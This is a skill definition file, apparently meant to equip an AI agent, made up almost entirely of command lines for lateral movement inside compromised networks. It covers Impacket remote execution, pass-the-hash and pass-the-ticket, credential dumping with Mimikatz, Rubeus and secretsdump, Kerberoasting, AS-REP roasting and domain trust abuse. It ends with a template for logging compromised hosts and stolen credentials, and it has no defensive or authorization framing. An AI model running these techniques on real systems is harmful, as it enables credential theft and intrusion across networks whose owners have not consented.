---
name: lateral-movement
description: Advanced lateral movement techniques across network segments, protocols, and trust relationships.
---

# Lateral Movement Skill

## Windows Lateral Movement

### PsExec/WMI/SMB
```bash
# Impacket PsExec
psexec.py domain/user:password@target

# WMI execution
wmiexec.py domain/user:password@target "cmd.exe /c whoami"

# SMB execution
smbexec.py domain/user:password@target

# DCOM execution
dcomexec.py domain/user:password@target
```

### Pass-the-Hash/Ticket
```bash
# Pass-the-Hash
psexec.py -hashes :<NTLM_HASH> domain/user@target

# Pass-the-Ticket
export KRB5CCNAME=/tmp/user.ccache
psexec.py -k -no-pass domain/user@target

# Overpass-the-Hash
export KRB5CCNAME=/tmp/user.ccache
psexec.py -k -no-pass domain/user@target
```

### Credential Harvesting
```bash
# Mimikatz
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Rubeus
Rubeus.exe dump /nowrap

# Secrets dump
secretsdump.py domain/user:password@target
```

## Linux Lateral Movement

### SSH-Based
```bash
# SSH key abuse
ssh -i /path/to/key user@target

# SSH agent forwarding
ssh -A user@jumphost

# ProxyJump
ssh -J user@jumphost user@target
```

### Service Abuse
```bash
# NFS mount
mount -t nfs target:/share /mnt/nfs

# Cron job abuse
crontab -l
cat /etc/crontab

# Systemd service
systemctl list-units --type=service
```

## Cross-Protocol Movement

### AD Attack Paths
```bash
# Kerberoasting → Crack → Service Account → Domain Admin
GetUserSPNs.py domain/user:password -request

# AS-REP Roasting → Crack → User → Lateral
GetNPUsers.py domain/ -usersfile users.txt -format hashcat

# Unconstrained Delegation → Capture TGT
Rubeus.exe monitor /interval:5
```

### Trust Abuse
```bash
# Forest trust abuse
lsadump::trust /patch

# Child domain trust
# Use krbtgt hash for golden ticket
```

## Output Format
```
[LATERAL] Protocol/Method
[SOURCE] Compromised host
[TARGET] Next host
[CREDENTIAL] Type used
[RESULT] Access achieved
```
